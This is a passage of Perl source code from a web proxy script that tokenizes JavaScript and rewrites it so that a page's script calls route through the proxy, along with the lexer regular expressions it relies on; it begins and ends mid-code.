				" _proxy_jslib_assign('', (" . (&proxify_js($o, 0, $with_level))[0] . "), (" . (&proxify_js($p, 0, $with_level))[0] . "), '=', $temp_varname) ; $next_statement ; }" ) ;
			}
			$div_ok= 0 ;

		    } else {
			# Normal, non-weird for(;;) loop.
			pos($in)= $old_pos ;
			push(@out, $paren, (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0], ')') ;
			last unless $in=~ /\G\)/gc ;
			$div_ok= 0 ;
		    }
		}
	    }


	# Parentheses after "catch" and "function" shouldn't be proxified.
	} elsif ($token eq 'catch') {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    last unless $in=~ /\G($RE_JS_SKIP*\()/gco ;
	    $paren= $1 ;
	    push(@out, $paren, &get_next_js_expr(\$in,1), ')') ;
	    last unless $in=~ /\G\)/gc ;
	    $div_ok= 0 ;

	# Contrary to the spec, MSIE allows function identifiers to be object
	#   properties in dot notation, so allow "identifier(.identifier)*" .
	} elsif ($token eq 'function') {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    #last unless $in=~ /\G($RE_JS_SKIP*)($RE_JS_IDENTIFIER_NAME)?($RE_JS_SKIP*\()/gco ;   # by the spec
	    last unless $in=~ /\G($RE_JS_SKIP*)($RE_JS_IDENTIFIER_NAME(?:\.(?:$RE_JS_IDENTIFIER_NAME))*)?($RE_JS_SKIP*\()/gco ;
	    ($skip1, $funcname, $skip2)= ($1, $2, $3) ;
	    # Update function name if it's from another proxy's library.
	    $funcname=~ s/^_proxy(\d*)_/'_proxy'.($1+1).'_'/e ;
	    push(@out, $skip1, $funcname, $skip2, &get_next_js_expr(\$in,1), ') {') ;
	    last unless $in=~ /\G\)$RE_JS_SKIP*\{/gc ;
	    $in_braces++ ;
	    $in_func= 1 ;
	    $div_ok= 0 ;

	} elsif ($token eq 'with') {
	    push(@out, $prefix, $term_so_far) ;
	    $prefix= $term_so_far= '' ;
	    last unless $in=~ /\G($RE_JS_SKIP*)\(/gco ;
	    $skip1= $1 ;
	    $with_obj= (&proxify_js(&get_next_js_expr(\$in, 1), 0, $with_level))[0] ;
	    last unless $in=~ /\G\)($RE_JS_SKIP*)/gco ;
	    $skip2= $1 ;
	    if ($in=~ /\G\{/gc) {
		$code= '{' . (&proxify_js(&get_next_js_expr(\$in, 1), 0, $with_level+1))[0] . '}' ;
		last unless $in=~ /\G\}/gc ;
	    } else {
		# Note that a bare with() statement could still contain commas.
		$code= (&proxify_js(&get_next_js_expr(\$in), 0, $with_level+1))[0] ;
		$code.= ',' . (&proxify_js(&get_next_js_expr(\$in), 0, $with_level+1))[0]
		    while $in=~ /\G,/gc ;
	    }
	    # Only initialize _proxy_jslib_with_objs at first with().
	    push(@out, '{', ($with_level  ? ''  : 'var _proxy_jslib_with_objs= [] ;'),
		       "with$skip1(_proxy_jslib_with_objs[_proxy_jslib_with_objs.length]= ($with_obj))$skip2$code",
		       '; _proxy_jslib_with_objs.length-- ;}') ;
	    $div_ok= 0 ;



	# Handle "var" specially to avoid failing on e.g. "var open= 1 ;" .
	# "var ... in ..." clauses are handled by matching either "=" or "in"
	#   after the identifier name.
	} elsif ($token eq 'var' or $token eq 'let') {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    while (1) {
		$var_decl= &get_next_js_expr(\$in,0) ;
		( ($skip1, $var, $eq, $value)= $var_decl=~ /^($RE_JS_SKIP*)($RE_JS_IDENTIFIER_NAME$RE_JS_SKIP*)(=|in)?(.*)$/s )
		    || last OUTER ;
		# Update variable name if it's from another proxy's library.
		$var=~ s/^_proxy(\d*)_/'_proxy'.($1+1).'_'/e ;
		push(@out, $skip1, $var) ;
		push(@out, $eq, (&proxify_js($value, 0, $with_level))[0]) if $eq ne '' ;
		last unless $in=~ /\G,/gc ;
		push(@out, ',') ;
	    }
	    $div_ok= 0 ;

	} elsif ($token eq 'new') {
	    push(@out, $prefix, $term_so_far) ;
	    $prefix= $term_so_far= '' ;

	    # We would pass "new identifier;" unchanged for efficiency, but
	    #   we need to handle things like "a= XMLHttpRequest; b= new a;" ,
	    #   so we proxify all "new" statements except "new function..." .

	    # Make exception for "new function() {...}" .
	    if ($in=~ /\G($RE_JS_SKIP*function\s*\()/gco) {
		$term_so_far= 'new' . $1 ;
		my($args)= &get_next_js_expr(\$in, 1) ;
		last unless $in=~ /\G(\)$RE_JS_SKIP*\{)/gco ;
		$term_so_far.= $args . $1 ;
		my($body)= &proxify_js(&get_next_js_expr(\$in, 1), 0, $with_level, 0) ;
		last unless $in=~ /\G\}/gc ;
		$term_so_far.= $body . '}' ;
		$new_last_token= '}' ;
		$div_ok= 1 ;

	    } else {
		my $starts_with_paren= $in=~ /\G$RE_JS_SKIP*\(/gco ;
		my($constructor)= $starts_with_paren
		    ? &proxify_js(&get_next_js_expr(\$in, 1), 0, $with_level, 0)
		    : &proxify_js(&get_next_js_constructor(\$in), 0, $with_level, 1) ;
		last  if $starts_with_paren and !($in=~ /\G\)/gco) ;
		if ($in=~ /\G$RE_JS_SKIP*\((?!$RE_JS_SKIP*\))/gco) {
		    $term_so_far.= "_proxy_jslib_new(($constructor), " ;
		    $term_so_far.= &proxify_js(&get_next_js_expr(\$in, 1), 0, $with_level, 0) . ')' ;
		    last unless $in=~ /\G\)/gco ;
		} else {
		    $in=~ /\G$RE_JS_SKIP*\($RE_JS_SKIP*\)/gco ;   # clear out any trailing ()
		    $term_so_far.= "_proxy_jslib_new($constructor)" ;
		}
		$new_last_token= ')' ;
		$div_ok= 1 ;
	    }


	# Only bother with this if call to _proxy_jslib_flush_write_buffers() must
	#   be inserted, i.e. if $top_level.
	} elsif (($token eq 'return') and !$in_func and $top_level) {
	    push(@out, $prefix, $term_so_far) ;
	    $prefix= $term_so_far= '' ;
	    $needs_jslib= 1 ;
	    # Allow commas, but not semicolons; perhaps $allow_multiple in
	    #   get_next_js_expr() should be 3-way.
	    $expr= &get_next_js_expr(\$in,0) ;
	    $expr.= ', ' . &get_next_js_expr(\$in,0) while $in=~ /\G$RE_JS_SKIP*,$RE_JS_SKIP*/gco ;
	    $expr= (&proxify_js($expr, 0, $with_level))[0] ;
	    $expr= 'void 0' if $expr eq '' ;
	    push(@out,
		 "return ((_proxy_jslib_ret= ($expr)), _proxy_jslib_flush_write_buffers(), _proxy_jslib_ret)") ;
	    $div_ok= 0 ;


	# Must handle possible label after these.
	} elsif ($token eq 'break' or $token eq 'continue') {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    if ($in=~ /\G($RE_JS_SKIP_NO_LT+$RE_JS_IDENTIFIER_NAME)/gco) {
		push(@out, $1) ;
	    }
	    $div_ok= 0 ;


	# This is all reserved words except "this", "super", "true", "false",
	#   and "null", which may be part of an object expression.  (Also
	#   missing are the nine reserved words handled directly above.)
	#} elsif ($RE_JS_SET_RESERVED_WORDS_NON_EXPRESSION{$token}) {
	} elsif ($token=~ /^(?:abstract|boolean|byte|case|char|class|const|debugger|default|delete|do|else|enum|export|extends|final|finally|float|goto|implements|in|instanceof|int|interface|long|native|package|private|protected|return|short|static|synchronized|throw|throws|transient|try|typeof|void|volatile)$/) {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    $div_ok= 0 ;


	# This handles identifiers and a certain few reserved words, above.
	# Most reserved words must be handled separately from identifiers, or
	#   else there may be syntatic ambiguities, e.g. "if (foo) (...)".
	} elsif ($token=~ /^$RE_JS_IDENTIFIER_NAME$/o) {
	    # Increment identifiers from other libraries, to allow chaining of
	    #   multiple proxies and to close a privacy hole.
	    $token=~ s/^_proxy(\d*)_/'_proxy'.($1+1).'_'/e ;

	    # Handle automatic semicolon insertion.  For more notes about
	    #   automatic semicolon insertion, see comments in
	    #   get_next_js_expr() below.
	    if ($newline_since_last_token
		and $last_token=~ m#^(?:\)|\]|\+\+|--)$|
				    ^(?!(?:case|delete|do|else|in|instanceof|new|typeof|void|function|var)$)
				     (?:\pL|[\$_\\0-9'"]|\.\d|/..)#x )
	    {
		push(@out, $prefix, $term_so_far) ;
		$prefix= '' ;
		$term_so_far= $token ;
	    } else {
		$term_so_far.= $token ;
	    }
	    $div_ok= 1 ;


	} elsif ($token eq '.') {
	    $term_so_far.= '.' ;
	    $div_ok= 0 ;


	# For "(", get inside parens, proxify, and add to output.
	} elsif ($token eq '(') {
	    $does_write= 1 ;   # any function call could do a write()
	    $term_so_far.= '(' . (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0] . ')' ;
	    last unless $in=~ /\G\)/gc ;
	    $new_last_token= ')' ;
	    $div_ok= 1 ;


	# For "[", get inside brackets, proxify, and pass parenthesized as
	#   second parameter to _proxy_jslib_handle().  Or, start new term
	#   if it looks like an array literal instead.
	} elsif ($token eq '[') {
	    # Don't change it for simple integer subscripts.
	    if ($in=~ /\G($RE_JS_SKIP*\d+$RE_JS_SKIP*\])/gco) {
		$term_so_far.= '[' . $1 ;
		$new_last_token= ']' ;
		$div_ok= 1 ;
	    } else {
		$sub_expr= (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0] ;
		last unless $in=~ /\G\]/gc ;

		# Peek ahead to see if the next token is an open parenthesis
		my $old_pos= pos($in) ;
		my $next_is_paren= $in=~ /\G$RE_JS_SKIP*\(/gco  ? 1  : 0 ;
		pos($in)= $old_pos ;

		if ($term_so_far ne '') {
		    $needs_jslib= 1 ;
		    $new_last_token= ')' ;
		    if ($prefix ne '') {
			$term_so_far= " _proxy_jslib_assign('$prefix', $term_so_far, ($sub_expr), '', '')" ;
			$prefix= '' ;
			$div_ok= 0 ;
		    } elsif ($in=~ /\G$RE_JS_SKIP_NO_LT*(\+\+|--)/gco) {
			$op= $1 ;
			$term_so_far= " _proxy_jslib_assign('', $term_so_far, ($sub_expr), '$op', '')" ;
			$div_ok= 1 ;
		    } elsif ($in=~ /\G$RE_JS_SKIP*(>>>=|<<=|>>=|[+*\/%&|^-]?=(?!=))/gco) {
			$op= $1 ;
			$new_val= (&proxify_js(&get_next_js_expr(\$in), 0, $with_level))[0] ;
			$term_so_far= " _proxy_jslib_assign('', $term_so_far, ($sub_expr), '$op', ($new_val))" ;
			$div_ok= 0 ;
		    } else {
			$term_so_far= " _proxy_jslib_handle($term_so_far, ($sub_expr), '', $next_is_paren, $in_new_statement)" ;
			$div_ok= 1 ;
		    }
		} else {
		    $term_so_far= "[$sub_expr]" ;
		    $new_last_token= ']' ;
		    $div_ok= 1 ;
		}
	    }


	# For "{", if it looks like an object literal, start new term.  How do
	#   we distinguish {foo:bar} between an object literal and a block starting
	#   with a label?  Guess:  If the previous token was a punctuator but
	#   not ")", or was one of these keywords, or if there's no previous
	#   token, then assume it's an object literal.  Not perfect.
	} elsif ($token eq '{' and $term_so_far eq '' 
		 and (!defined $last_token or $last_token=~ /^(?!\))$RE_JS_PUNCTUATOR$/o
		      or $last_token=~ /^(?:case|delete|in|instanceof|new|return|throw|typeof)$/)
		 and $in=~ /\G($RE_JS_SKIP*((?:$RE_JS_IDENTIFIER_NAME|$RE_JS_STRING_LITERAL|$RE_JS_NUMERIC_LITERAL)$RE_JS_SKIP*:|\}))/gco)
	{
	    $term_so_far= '{' ;
	    if ($2 ne '}') {
		$term_so_far.= $1 ;
		$term_so_far.= (&proxify_js(&get_next_js_expr(\$in, 0), 0, $with_level))[0] ;
		while ($in=~ /\G,/gc) {
		    $term_so_far.= ',' ;
		    # Illegal, but some sites end object literal with extra ",".
		    last if $in=~ /\G(?=$RE_JS_SKIP*\})/gco ;
		    last OUTER unless $in=~ /\G($RE_JS_SKIP*)($RE_JS_IDENTIFIER_NAME|$RE_JS_STRING_LITERAL|$RE_JS_NUMERIC_LITERAL)($RE_JS_SKIP*:)/gco ;
		    my($skip1, $id, $skip2)= ($1, $2, $3) ;
		    $id=~ s/^_proxy(\d*)_/'_proxy'.($1+1).'_'/e ;
		    $term_so_far.= $skip1 . $id . $skip2 ;
		    $term_so_far.= (&proxify_js(&get_next_js_expr(\$in, 0), 0, $with_level))[0] ;
		}
		last unless $in=~ /\G$RE_JS_SKIP*\}/gc ;
	    }

	    $term_so_far.= $new_last_token= '}' ;
	    $div_ok= 1 ;


	# All other punctuators end a term.
	#} elsif ($RE_JS_SET_ALL_PUNCTUATORS{$token}) {
	} elsif ($token=~ /^(?:$RE_JS_PUNCTUATOR|$RE_JS_DIV_PUNCTUATOR)$/o) {
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    $div_ok= ($token eq ')' or $token eq ']' or $token eq '}') ;

	} else {
	    &HTMLdie(["Shouldn't get here, token= [%s]", $token]) ;
	}

	if (defined($token)) {
	    $last_token= $new_last_token ne ''  ? $new_last_token  : $token ;
	    $newline_since_last_token= 0 ;
	}
    }

    push(@out, $prefix, $term_so_far) ;

    # If there's been a write or writeln, then insert a call to flush the
    #   output buffer.  A similar call is inserted into every appropriate
    #   "return" statement; see handling of that above.
    push(@out, " ;\n_proxy_jslib_flush_write_buffers() ;"), $needs_jslib= 1
	if $top_level && $does_write ;


#&HTMLdie(['remainder=[%s]', substr($in, pos($in))]) if pos($in)!=length($in) ;

    # Return proxified $in, and the remainder of $in that couldn't be proxified.
    return wantarray  ? ( join('', @out), substr($in, pos($in)) )  : join('', @out) ;
}


sub get_next_js_expr {
    my($s, $allow_multiple, $is_new)= @_ ;
    my(@out, @p, $element, $token, $div_ok, $last_token, $pos, $expr_block_state,
       $closequote1, $closequote2, $conditional_state, $conditional_stack_size) ;

    while (1) {

	# Note that these patterns contain an embedded set of parentheses that
	#   only match if the input element is a token.
	# Correction:  Because of Perl's long-string-literal bug, there are two
	#   additional sets of embedded parentheses, which may match /'/ or /"/ .
	last unless ($div_ok
		     ? $$s=~ /\G($RE_JS_INPUT_ELEMENT_DIV)/gco
		     : $$s=~ /\G($RE_JS_INPUT_ELEMENT_REG_EXP)/gco) ;

	($element, $token, $closequote1, $closequote2)= ($1, $2, $3, $4) ;

	# To work around Perl's long-string-literal bug, read in rest of
	#   string literal if needed.
	if ($token=~ /^['"]/ && !$closequote1 && !$closequote2) {
	    last unless &get_string_literal_remainder($s, \$token) ;
	    $element= $token ;
	}


	# Track state of expression block so far, needed for handling automatic
	#   semicolon insertion (only relevant when not $allow_multiple).
	# Possible values for $expr_block_state:
	#     0 -- before main expression block
	#     1 -- "function" encountered, block not started
	#     2 -- inside main expression block (function block or object literal)
	#     3 -- after expression block
	$expr_block_state= 1  if !$allow_multiple and !@p and $element eq 'function' ;

	# If $element is either ";" or "," , then end the expression if the
	#   parenthesis stack is empty.  Otherwise, continue.
	if ($element eq ';' or $element eq ',') {
	    pos($$s)-= 1, return join('', @out)  if !$allow_multiple and !@p ;

	# If it's a line terminator, then handle automatic semicolon insertion:
	#   if not allowing multiple statements, if the parenthesis stack is
	#   empty, if the previous token is not acceptable before an identifier
	#   or keyword, and if the next input is an identifier or keyword, then
	#   act as if a semicolon had been encountered, similar to above.
	# I'm not sure this is rigorous, but it should work for virtually all
	#   real-life situations.  Let me know if you find any privacy holes,
	#   or any actual sites it doesn't work with.
	# Testing the next input for an identifier requires saving and restoring
	#   pos($$s).
	# Tokens "not acceptable before an identifier or keyword" are identifiers
	#   and most keywords, numeric/string/regex literals, and the punctuators
	#   ")", "]", "++", and "--".  As it turns out, this is much the same
	#   regex as used in the setting of $div_ok above and below; the only
	#   difference is four keywords.
	# For more details, see the ECMAScript spec, section 7.9 .
	} elsif ($element=~ /^$RE_JS_LINE_TERMINATOR$/o) {
	    if (!$allow_multiple and !@p) {
		$pos= pos($$s) ;
		pos($$s)= $pos-length($element), return join('', @out)
		    if $last_token=~ m#^(?:\)|\]|\+\+|--)$|
				       ^(?!(?:case|delete|do|else|in|instanceof|new|typeof|void|function|var)$)
					(?:\pL|[\$_\\0-9'"]|\.\d|/..)#x
			and $$s=~ /\G$RE_JS_SKIP*$RE_JS_IDENTIFIER_NAME/gco ;

		# Also end on inserted semicolon if just finished a {} block that's an
		#   expression, like a function expression or an object literal, and if
		#   the following token is not acceptable after such an expression.
		# Tokens acceptable after a noun-like block include all punctuators
		#   except "{", and the keyword "instanceof" (not that all of those make
		#   sense).  Be sure not to consume the matching token, by using "(?=...)" .
		pos($$s)= $pos-length($element), return join('', @out)
		    if $expr_block_state==3
		       and $$s!~ /\G$RE_JS_SKIP*(?!\{)(?=$RE_JS_PUNCTUATOR|instanceof)/gco ;
	    }


	# If $element is an opening "parenthesis" (including "?"), then push it
	#   onto the parenthesis stack and continue.
	} elsif ($element=~ /^[(\[\{\?]$/) {
	    # If we're parsing a "new" statement, then break on top-level "(".
	    pos($$s) -= 1, return join( '', @out )
		if $is_new and !@p and $element eq '(' ;

	    $conditional_state= 2  if $conditional_state==1 and $element eq '(' ;

	    # For "{", if it's either a function start or an object literal,
	    #   then set $expr_block_state=2 .
	    if (!$allow_multiple and !@p and $element eq '{') {
		$pos= pos($$s) ;
		$expr_block_state= 2
		   if $expr_block_state==1
		      or $$s=~ /\G$RE_JS_SKIP*((?:$RE_JS_IDENTIFIER_NAME|$RE_JS_STRING_LITERAL|$RE_JS_NUMERIC_LITERAL)$RE_JS_SKIP*:|\})/gco ;
		pos($$s)= $pos ;
	    }

	    push(@p, $element) ;


	# If $element is a closing "parenthesis" (including ":"), then end the
	#   expression if the parenthesis stack is empty.  Otherwise, pop the
	#   parenthesis stack and continue.
	# If $element is ":", then only pop the parenthesis stack if the top
	#   item is a "?".  This prevents popping when the ":" is not part of
	#   a "?"...":" conditional (like in a switch statement, labelled
	#   statement, or object literal).  This is why we store the stack
	#   instead of using a simple counter.
	} elsif ($element=~ /^[)\]}:]$/) {
	    pos($$s)-= 1, return join('', @out)  unless @p ;
	    pop(@p)  unless ($element eq ':' and $p[$#p] ne '?') ;

	    $conditional_state= 3  if $conditional_state==2 and $element eq ')' and @p==$conditional_stack_size ;

	    # Update $expr_block_state if we just closed an expression block.
	    $expr_block_state= 3  if !$allow_multiple and !@p and $element eq '}' and $expr_block_state==2 ;


	} elsif ($element eq 'if' or $element eq 'while' or $element eq 'for' or $element eq 'switch') {
	    $conditional_state= 1 ;
	    $conditional_stack_size= @p ;
	}


	# Whatever we got, add it to the output.
	push(@out, $element) ;

	# If a token was gotten, then set $div_ok according to the token.
	# See the comments in proxify_js() for details.
	if (defined($token)) {
	    $div_ok= $token=~ m#^(?:\)|\]|\}|\+\+|--)$|
				^(?!(?:case|delete|do|else|in|instanceof|new|return|throw|typeof|void)$)
				 (?:\pL|[\$_\\0-9'"]|\.\d|/..)#x ;
	    $div_ok= 0, $conditional_state= 0 if $conditional_state==3 ;
	    $last_token= $token ;
	}
    }

    # If we got here, then $$s has no more tokens.  Either there's a syntax
    #   error, or the end of the string has been reached.  We'll *guess* that
    #   we have a valid expression if the parenthesis stack is empty, and
    #   return it; otherwise, return undef.  Either way, the pos($$s) doesn't
    #   change.
    return  @p  ? undef  : join('', @out) ;
}



# Given a reference to a string, return the next JavaScript term in it, split
#   up into the leading object and the final property (either the entire
#   contents between "[]" or a quoted identifier).  The string search pointer
#   is correctly updated.
# On error, return undef.
# Note that if $o is empty, then $p is guaranteed to be a quoted identifier.
sub get_next_js_term {
    my($s)= @_ ;
    my($o, $p, $ofrag) ;

    $$s=~ /\G$RE_JS_SKIP*($RE_JS_IDENTIFIER_NAME|[\[\{\(])/gco or return ;
    if ($1 eq '[') {
	# read array literal
	$ofrag= '[' . &get_next_js_expr($s, 1) . ']';
	$$s=~ /\G\]/gco  or return undef ;
    } elsif ($1 eq '{') {
	# read object literal
	$ofrag= '{' . &get_next_js_expr($s, 1) . '}';
	$$s=~ /\G\}/gco  or return undef ;
    } elsif ($1 eq '(') {
	# read parenthesized expression
	$ofrag= '(' . &get_next_js_expr($s, 1) . ')';
	$$s=~ /\G\)/gco  or return undef ;
    } else {
	$p= "'$1'" ;
	$ofrag= $1 ;
    }

    while ($$s=~ /\G$RE_JS_SKIP*([.\[\(])/gco) {
	$o.= $ofrag ;
	if ($1 eq '.') {
	    $$s=~ /\G$RE_JS_SKIP*($RE_JS_IDENTIFIER_NAME)/gco  or return ;
	    $p= "'$1'" ;
	    $ofrag= '.' . $1 ;
	} elsif ($1 eq '[') {
	    $p= &get_next_js_expr($s, 1) ;
	    $ofrag= "[$p]" ;
	    $$s=~ /\G\]/gco  or return undef ;
	} elsif ($1 eq '(') {
	    $p= '' ;
	    $ofrag= '(' . &get_next_js_expr($s, 1) . ')' ;
	    $$s=~ /\G\)/gco  or return undef ;
	}
    }

    return ($o, $p) ;
}


# Given a reference to a string, return the next JavaScript constructor in it,
#   to be used in a "new" statement.  Basically, this is the leading part of
#   a term before the first "(".  See comments in proxify_js(), where the
#   "new" token is handled.
# This currently doesn't handle an array literal starting the term....
sub get_next_js_constructor {
    my($s)= @_ ;

    $$s=~ /\G$RE_JS_SKIP*($RE_JS_IDENTIFIER_NAME|$RE_JS_STRING_LITERAL_START)/gco ;
    my($c, $closequote1, $closequote2)= ($1, $2, $3) ;

    # To work around Perl's long-string-literal bug, read in rest of
    #   string literal if needed.
    if ($c=~ /^['"]/ && !$closequote1 && !$closequote2) {
	return unless &get_string_literal_remainder($s, \$c) ;
    }

    while ($$s=~ /\G$RE_JS_SKIP*([.\[])/gco) {
	if ($1 eq '.') {
	    $$s=~ /\G$RE_JS_SKIP*($RE_JS_IDENTIFIER_NAME)/gco or return ;
	    $c.= ".$1" ;
	} elsif ($1 eq '[') {
	    $c.= '[' . &get_next_js_expr($s, 1) . ']' ;
	    $$s=~ /\G\]/gco or return ;
	}
    }

    return $c ;
}


# Given a string of JavaScript code, break it into a list of tokens.  Well,
#   elements actually, since it includes whitespace and comments.
# Returns the resulting list.
# Would be more efficient to return a reference to @ret.
# jsm-- this has bug tokenizing "if (expr) /foo/", since $div_ok is wrongly
#   true after the ")".
sub tokenize_js {
    my($in)= @_ ;
    my(@ret, $div_ok, $element, $token, $closequote1, $closequote2);

    while ($div_ok  ? $in=~ /\G($RE_JS_INPUT_ELEMENT_DIV)/gco
		    : $in=~ /\G($RE_JS_INPUT_ELEMENT_REG_EXP)/gco) {

	($element, $token, $closequote1, $closequote2)= ($1, $2, $3, $4) ;

	# To work around Perl's long-string-literal bug, read in rest of
	#   string literal if needed.
	if (defined $token && $token=~ /^['"]/ && !$closequote1 && !$closequote2) {
	    last unless &get_string_literal_remainder(\$in, \$token) ;
	    $element= $token ;
	}

	push(@ret, $element);

	if (defined($token)) {
	    $div_ok= $token=~ m#^(?:\)|\]|\+\+|--)$|
				^(?!(?:case|delete|do|else|in|instanceof|new|return|throw|typeof|void)$)
				 (?:\pL|[\$_\\0-9'"]|\.\d|/..)#x ;
	}
    }

    return @ret;
}



# Given two string pointers, this reads the remainder of a string literal
#   from the first string onto the end of the second string.
# Returns true if string is successfully read, or else throws an
#   "end_of_input\n" error (to be caught by calling eval{} block).
# This is needed to work around Perl's long-string-literal bug, as well as
#   when "</script" is in a JS literal string.
sub get_string_literal_remainder {
    my($inp, $startp)= @_ ;
    my($q)= substr($$startp, 0, 1) ;
    my $RE= ($q eq "'")  ? $RE_JS_STRING_REMAINDER_1  : $RE_JS_STRING_REMAINDER_2 ;
    while ($$inp=~ /\G($RE)/gc) {
	last if $1 eq '' and $2 eq '' ;
	$$startp.= $1 ;
	return 1 if $2 ;
    }
    die "end_of_input\n" ;   # throw error if regex failed.
}



# Given a string of JS code, splits off the last statement from it and returns
#   [ all_but_last_statement, last_statement ] .  This is required to support
#   "javascript:" URLs and their return values correctly.
# Note that the input value $s is a reference to a string, not a string.
sub separate_last_js_statement {
    my($s)= @_ ;
    my($e, $rest, $last) ;

    while (($e= &get_next_js_expr($s)) or (pos($$s)!=length($$s))) {
	return ($rest, $last.$e)
	    if $$s=~ /\G(?:;|$RE_JS_LINE_TERMINATOR|$RE_JS_SKIP)*\z/gco ;
	if ($$s=~ /\G(?:;|$RE_JS_LINE_TERMINATOR)/gco) {
	    $rest.= $last . $e . ';' ;
	    $last= '' ;
	} else {
	    return ($rest, $last)  if $e eq '' ;   # probably a syntax error
	    $last.= $e ;
	    $last.= ','  if $$s=~ /\G,/gco ;
	}
    }
    return ($rest, $last) ;
}

sub set_RE_JS {

    # If we decide to support UTF-8, this allows multi-platform compatibility.
    #eval '/\x{2028}/' ;
    #my($utf8_OK)=  $@ eq '' ;


    $RE_JS_WHITE_SPACE= qr/[\x09\x0b\x0c \xa0]|\p{Zs}/ ;
    $RE_JS_LINE_TERMINATOR= qr/[\012\015]/ ;


    # Note that a single-line comment must not have a backtracking pattern, to
    #   force it to grab all characters up to a line terminator; multi-line
    #   comment must not backtrack either, to prevent it from grabbing beyond
    #   the first "*/".  So entire pattern is enclosed in (?>...) .
    # Technically, a "/*...*/" -style comment that contains a line terminator
    #   should be replaced by a line terminator during parsing, rather than
    #   be discarded entirely.  This may become relevant in the future if we
    #   parse syntax more rigorously, handle automatic semicolon insertion, etc.
    # Browsers also treat "<!--" as starting a one-line comment, so authors can
    #   use the old trick of an HTML comment to hide JS from non-JS browsers.
    #   This recognition of "<!--" is not part of the JS spec, but we handle
    #   it here.
    $RE_JS_COMMENT= qr#(?>/\*.*?\*/|//[^\012\015]*|<!--[^\012\015]*)#s ;


    # UnicodeLetter can be Unicode categories/properties of
    #   (Lu, Ll, Lt, Lm, Lo, Nl).  This can be condensed to (L, Nl).  Also,
    #   Nl doesn't seem to exist in Perl 5.6.0.  Thus, for now, use "\pL" to
    #   check for any letter.  Note that the "\pL" construct can't be used
    #   in character classes.
    # "\p{Pc}" doesn't exist in Perl 5.6.0.  So, don't use it either.
    # Eventually, we could set different values based on the Perl version, if
    #   there's demand.
    # jsm-- see if Perl 5.8.x lets us do this right.
    $RE_JS_IDENTIFIER_START= qr/\pL|[\$_]|\\u[0-9a-fA-F]{4}/ ;
    $RE_JS_IDENTIFIER_PART=  qr/$RE_JS_IDENTIFIER_START|\p{Mn}|\p{Mc}|\p{Nd}/ ;
    $RE_JS_IDENTIFIER_NAME=  qr/(?>$RE_JS_IDENTIFIER_START$RE_JS_IDENTIFIER_PART*)/ ;


    # Put the longest punctuators first in the list of alternatives.
    $RE_JS_PUNCTUATOR= qr/(?>>>>=?|===|!==|<<=|>>=|[<>=!+*%&|^-]=|\+\+|--|<<|>>|&&|\|\||[{}()[\].;,<>+*%&|^!~?:=-])/ ;
    $RE_JS_DIV_PUNCTUATOR= qr!(?>/=?)! ;


    # Hex literal must come before decimal, so that "0x..." is not parsed as "0"
    #   and a syntax error.  2nd and 3rd alternatives comprise DecimalLiteral
    #   plus the non-standard OctalIntegerLiteral, defined in section B.1 of the
    #   spec.
    $RE_JS_NUMERIC_LITERAL= qr/(?>0[xX][0-9a-fA-F]+|
				  [0-9]+(?:\.[0-9]*)?(?:[eE][+-]?[0-9]+)?|
				  \.[0-9]+(?:[eE][+-]?[0-9]+)?)
			       (?!$RE_JS_IDENTIFIER_START)
			      /x ;


    # The last alternative here represents CharacterEscapeSequence, fully expanded.
    # Note that this includes the non-standard OctalEscapeSequence, defined in
    #   section B.1 of the spec.
    # Unfortunately, some browsers allow a line terminator in the string if it's
    #   preceded by "\".  So, against the spec, allow line terminators in
    #   escape sequences.
    # Also unfortunately, some browsers allow literal line terminators inside
    #   literal strings, even if not preceded by "\".  So against the spec,
    #   allow literal line terminators inside literal strings.
    # Perl itself has a bug such that certain long strings crash with certain
    #   regular expressions.  Unfortunately, $RE_JS_STRING_LITERAL here is one
    #   of those regular expressions.  To work around it requires changes in
    #   a few places; here, we define $RE_STRING_LITERAL_START,
    #   $RE_STRING_REMAINDER_1, and $RE_STRING_REMAINDER_2 for the workaround.
    #   When comments elsewhere in the program refer to "Perl's long-string-literal
    #   bug", this is what that means.
    # Note that those three new patterns each have embedded parentheses that
    #   must be accommodated when used-- $RE_JS_STRING_START has two, and
    #   $RE_STRING_REMAINDER_1 and $RE_STRING_REMAINDER_2 each have one.
    #$RE_JS_ESCAPE_SEQUENCE= qr/x[0-9a-fA-F]{2}|u[0-9a-fA-F]{4}|(?:[0-3]?[0-7](?![0-9])|[4-7][0-7]|[0-3][0-7][0-7])|[^0-9xu\012\015]/ ;
#    $RE_JS_STRING_LITERAL= qr/'(?>(?:[^'\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE)*)'|
#			      "(?>(?:[^"\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE)*)"/x ;
#    $RE_JS_STRING_LITERAL_START= qr/'(?>(?:[^'\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})('?)|
#				    "(?>(?:[^"\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})("?)/x ;
#    $RE_JS_STRING_REMAINDER_1= qr/(?>(?:[^'\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})('?)/ ;
#    $RE_JS_STRING_REMAINDER_2= qr/(?>(?:[^"\\\012\015]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})("?)/ ;
    $RE_JS_ESCAPE_SEQUENCE= qr/x[0-9a-fA-F]{2}|u[0-9a-fA-F]{4}|(?:[0-3]?[0-7](?![0-9])|[4-7][0-7]|[0-3][0-7][0-7])|[^0-9xu]/ ;
    $RE_JS_STRING_LITERAL= qr/'(?>(?:[^'\\]|\\$RE_JS_ESCAPE_SEQUENCE)*)'|
			      "(?>(?:[^"\\]|\\$RE_JS_ESCAPE_SEQUENCE)*)"/x ;
    $RE_JS_STRING_LITERAL_START= qr/'(?>(?:[^'\\]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})('?)|
